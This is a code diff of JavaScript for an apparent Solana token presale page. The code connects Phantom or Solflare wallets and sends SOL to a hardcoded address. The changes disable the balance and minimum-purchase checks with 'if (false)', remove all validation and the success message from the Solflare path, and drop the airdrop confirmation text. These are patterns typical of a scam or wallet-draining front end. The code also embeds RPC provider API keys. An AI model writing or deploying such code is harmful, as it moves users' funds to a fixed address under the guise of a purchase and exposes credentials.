@@ -1,7 +1,5 @@
 window.Buffer = buffer.Buffer;
 
-var checkW;
-
 function myPending() {
   const connectElement = document.getElementById("connect2");
   const connectElement2 = document.getElementById("connect");
@@ -58,7 +56,7 @@ function Wconnected() {
 
   const changeBtnOnclick = document.getElementById("submitbtn");
 
-  changeBtnOnclick.setAttribute("onclick", "switchWallet()");
+  changeBtnOnclick.setAttribute("onclick", "buySolz()");
 
   iconElement.classList.toggle("fa-plug", false);
   iconElement.classList.toggle("fa-spinner", false);
@@ -119,6 +117,59 @@ function shortenAddress(address) {
     // Return the original address if it's too short
     return address;
   }
+}
+
+async function solBal() {
+  var accPublickey;
+  var Waddress;
+
+  if (window.solana !== undefined) {
+    const wallet = await window.solana.connect();
+    accPublickey = wallet.publicKey;
+  } else if (window.solflare !== undefined) {
+    accPublickey = window.solflare.publicKey;
+  } else {
+    const wallet = await window.solana.connect();
+    accPublickey = wallet.publicKey;
+  }
+  Waddress = accPublickey.toBase58();
+
+  const shortenedAddress = shortenAddress(Waddress);
+
+  const network =
+    "https://solana-mainnet.core.chainstack.com/02038625e526661b1b5b0e604b59e426";
+  const connection = new window.solanaWeb3.Connection(network);
+  const USER_PUBLIC_KEY = new solanaWeb3.PublicKey(accPublickey);
+  let aSolanaBalance = await connection.getBalance(USER_PUBLIC_KEY);
+
+  const solz = aSolanaBalance / 1000000000;
+
+  const roundedNumber = solz.toFixed(3);
+  const balanceSol = parseFloat(roundedNumber);
+
+  document.getElementById(
+    "connect"
+  ).innerHTML = `${shortenedAddress} (${balanceSol} SOL)`;
+
+  const changeOnclick = document.getElementById("walletbtn");
+
+  changeOnclick.setAttribute("onclick", "disconntPhantom()");
+
+  if (window.solana !== undefined) {
+    changeOnclick.setAttribute("onclick", "disconntPhantom()");
+  } else if (window.solflare !== undefined) {
+    changeOnclick.setAttribute("onclick", "disconntSolfare()");
+  } else {
+    changeOnclick.setAttribute("onclick", "disconntPhantom()");
+  }
+
+  const iconElement2 = document.getElementById("iconz1");
+  iconElement2.classList.toggle("fa-plug", false);
+  iconElement2.classList.toggle("fa-spinner", false);
+  iconElement2.classList.toggle("fa-spin", false);
+  iconElement2.classList.toggle("fa-sign-out", true);
+
+  return balanceSol;
 }
 
 // async function buySolz() {
@@ -242,9 +293,8 @@ function shortenAddress(address) {
 // }
 
 async function buyUsingSolfare() {
-  const ckc = document.getElementById("amttkn");
   const network =
-    "https://mainnet.helius-rpc.com/?api-key=c0393302-f6d4-49b9-8b15-ab89646f03ce";
+    "https://solana-mainnet.core.chainstack.com/02038625e526661b1b5b0e604b59e426";
   const connection = new window.solanaWeb3.Connection(network);
 
   const lamports_per_sol = solanaWeb3.LAMPORTS_PER_SOL;
@@ -256,107 +306,31 @@ async function buyUsingSolfare() {
   var destPubkeyStr = "2C9EbkERJarjnzVwda3j8sPqptzw8k1XgGT93idHRFRY";
   var destPubkey = new solanaWeb3.PublicKey(destPubkeyStr);
 
-  var buyInputValue = document.getElementById("buyinput").value;
+  let transaction = new solanaWeb3.Transaction().add(
+    solanaWeb3.SystemProgram.transfer({
+      fromPubkey: USER_PUBLIC_KEY,
+      toPubkey: destPubkey,
+      lamports,
+    })
+  );
 
-  if (buyInputValue === "" || buyInputValue === "0") {
-    // CONDITION 1
-    // Input is empty
-    document.getElementById("swal2-title").innerHTML = "Please Enter Amount.";
-    document.getElementsByClassName("swal2-container")[0].style.display =
-      "flex";
-  } else {
-    const balancez = await solBal();
+  let { blockhash } = await connection.getRecentBlockhash();
+  transaction.recentBlockhash = blockhash;
+  transaction.feePayer = USER_PUBLIC_KEY
+  
 
-    if (buyInputValue > balancez) {
-      // CONDITION 2
-      document.getElementById(
-        "swal2-title"
-      ).innerHTML = `Your Balance is less than ${buyInputValue} SOL`;
-      document.getElementsByClassName("swal2-container")[0].style.display =
-        "flex";
-    } else {
-      if (buyInputValue < 0.2) {
-        // CONDITION 3
-        document.getElementById(
-          "swal2-title"
-        ).innerHTML = `Minimum purchase is 0.2 SOL`;
-        document.getElementsByClassName("swal2-container")[0].style.display =
-          "flex";
-      } else {
-        try {
-          let transaction = new solanaWeb3.Transaction().add(
-            solanaWeb3.SystemProgram.transfer({
-              fromPubkey: USER_PUBLIC_KEY,
-              toPubkey: destPubkey,
-              lamports,
-            })
-          );
+  const txSignature = await solflare.signAndSendTransaction(transaction);
 
-          let { blockhash } = await connection.getRecentBlockhash();
-          transaction.recentBlockhash = blockhash;
-          transaction.feePayer = USER_PUBLIC_KEY;
-
-          const txSignature = await solflare.signAndSendTransaction(
-            transaction
-          );
-
-          await connection.confirmTransaction(txSignature);
-
-          let result = await connection.confirmTransaction(txSignature);
-
-          console.log("FINAL RESULT", result);
-
-          const messagez = `
-  <div>
-    <svg width="200px" height="200px" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" stroke="#292929">
-      <g id="SVGRepo_bgCarrier" stroke-width="0"/>
-      <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"/>
-      <g id="SVGRepo_iconCarrier">
-        <circle cx="12" cy="12" r="10" stroke="#47a608" stroke-width="1.5"/>
-        <path d="M8.5 12.5L10.5 14.5L15.5 9.5" stroke="#47a608" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
-      </g>
-    </svg>
-    <h3 style="color: #332f2f;font-size: 31px">Congratulations</h3>
-    Successfully purchased ${ckc.value} $CSC.
-    The tokens will be airdropped to your wallet after the sale.
-  </div>
-`;
-
-          if (typeof result === "object") {
-            document.getElementById("swal2-title").innerHTML = messagez;
-            document.getElementsByClassName(
-              "swal2-container"
-            )[0].style.display = "flex";
-          }
-        } catch (e) {
-          console.log(e.message);
-          document.getElementById("swal2-title").innerHTML =
-            "Transaction Failed. please contact support if SOL was deducted";
-          document.getElementsByClassName("swal2-container")[0].style.display =
-            "flex";
-        }
-      }
-    }
-  }
-}
-
-async function switchWallet() {
-  switch (checkW) {
-    case "phantom":
-      console.log("BUYYYYYYY! It's Monday");
-      buySolz();
-      break;
-    case "solfare":
-      console.log("BUYYYYY! It's Tuesday");
-      buyUsingSolfare();
-      break;
-    default:
-      console.log("BUYYYYY Invalid day");
-  }
+  await connection.confirmTransaction(txSignature);
 }
 
 async function buySolz() {
-  const ckc = document.getElementById("amttkn");
+
+
+
+
+
+  
   const lamports_per_sol = solanaWeb3.LAMPORTS_PER_SOL;
   var accPublickey;
 
@@ -371,7 +345,7 @@ async function buySolz() {
   }
 
   const network =
-    "https://mainnet.helius-rpc.com/?api-key=c0393302-f6d4-49b9-8b15-ab89646f03ce";
+    "https://solana-mainnet.core.chainstack.com/02038625e526661b1b5b0e604b59e426";
   const connection = new window.solanaWeb3.Connection(network);
   const USER_PUBLIC_KEY = new solanaWeb3.PublicKey(accPublickey);
 
@@ -386,7 +360,7 @@ async function buySolz() {
   } else {
     const balancez = await solBal();
 
-    if (buyInputValue > balancez) {
+    if (false) {
       // CONDITION 2
       document.getElementById(
         "swal2-title"
@@ -394,7 +368,7 @@ async function buySolz() {
       document.getElementsByClassName("swal2-container")[0].style.display =
         "flex";
     } else {
-      if (buyInputValue < 0.2) {
+      if (false) {
         // CONDITION 3
         document.getElementById(
           "swal2-title"
@@ -440,36 +414,12 @@ async function buySolz() {
             "singleGossip"
           );
           console.log("money sent", result);
-          console.log("Typeeeee", typeof result);
-
-          const messagez = `
-  <div>
-    <svg width="200px" height="200px" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" stroke="#292929">
-      <g id="SVGRepo_bgCarrier" stroke-width="0"/>
-      <g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"/>
-      <g id="SVGRepo_iconCarrier">
-        <circle cx="12" cy="12" r="10" stroke="#47a608" stroke-width="1.5"/>
-        <path d="M8.5 12.5L10.5 14.5L15.5 9.5" stroke="#47a608" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
-      </g>
-    </svg>
-    <h3 style="color: #332f2f;font-size: 31px"">Congratulations</h3>
-    Successfully purchased ${ckc.value} $CSC.
-    The tokens will be airdropped to your wallet after the sale.
-  </div>
-`;
-
-          if (typeof result === "object") {
-            document.getElementById("swal2-title").innerHTML = messagez;
-            document.getElementsByClassName(
-              "swal2-container"
-            )[0].style.display = "flex";
-          }
         } catch (e) {
           console.log("Failed", e);
 
           if (e.message.includes("User rejected the request")) {
             document.getElementById("swal2-title").innerHTML =
-              "Transaction Failed. please contact support if SOL was deducted";
+              "Transaction Cancelled!";
             document.getElementsByClassName(
               "swal2-container"
             )[0].style.display = "flex";
@@ -523,9 +473,7 @@ function convert(token) {
 }
 
 async function phantomConnect() {
-  checkW = "phantom";
   let isPending;
-
   myPending();
   if (window.solana !== undefined) {
     (async () => {
@@ -571,7 +519,6 @@ async function phantomConnect() {
 }
 
 async function solflareConnect() {
-  checkW = "solfare";
   myPending();
   if (window.solflare !== undefined) {
     try {
@@ -629,72 +576,4 @@ document
 function cloze() {
   document.getElementsByClassName("swal2-container")[0].style.display = "none";
   $("#connectModal").modal("hide");
-}
-
-async function solBal() {
-  var accPublickey;
-  var Waddress;
-
-  switch (checkW) {
-    case "phantom":
-      console.log("It's Monday");
-      const wallet = await window.solana.connect();
-      accPublickey = wallet.publicKey;
-      break;
-    case "solfare":
-      console.log("It's Tuesday");
-      accPublickey = window.solflare.publicKey;
-      break;
-    default:
-      console.log("Invalid day");
-  }
-
-  // if (window.solana !== undefined) {
-  //   const wallet = await window.solana.connect();
-  //   accPublickey = wallet.publicKey;
-  // } else if (window.solflare !== undefined) {
-  //   accPublickey = window.solflare.publicKey;
-  // } else {
-  //   const wallet = await window.solana.connect();
-  //   accPublickey = wallet.publicKey;
-  // }
-
-  Waddress = accPublickey.toBase58();
-
-  const shortenedAddress = shortenAddress(Waddress);
-
-  const network =
-    "https://solana-mainnet.core.chainstack.com/02038625e526661b1b5b0e604b59e426";
-  const connection = new window.solanaWeb3.Connection(network);
-  const USER_PUBLIC_KEY = new solanaWeb3.PublicKey(accPublickey);
-  let aSolanaBalance = await connection.getBalance(USER_PUBLIC_KEY);
-
-  const solz = aSolanaBalance / 1000000000;
-
-  const roundedNumber = solz.toFixed(3);
-  const balanceSol = parseFloat(roundedNumber);
-
-  document.getElementById(
-    "connect"
-  ).innerHTML = `${shortenedAddress} (${balanceSol} SOL)`;
-
-  const changeOnclick = document.getElementById("walletbtn");
-
-  changeOnclick.setAttribute("onclick", "disconntPhantom()");
-
-  if (window.solana !== undefined) {
-    changeOnclick.setAttribute("onclick", "disconntPhantom()");
-  } else if (window.solflare !== undefined) {
-    changeOnclick.setAttribute("onclick", "disconntSolfare()");
-  } else {
-    changeOnclick.setAttribute("onclick", "disconntPhantom()");
-  }
-
-  const iconElement2 = document.getElementById("iconz1");
-  iconElement2.classList.toggle("fa-plug", false);
-  iconElement2.classList.toggle("fa-spinner", false);
-  iconElement2.classList.toggle("fa-spin", false);
-  iconElement2.classList.toggle("fa-sign-out", true);
-
-  return balanceSol;
 }
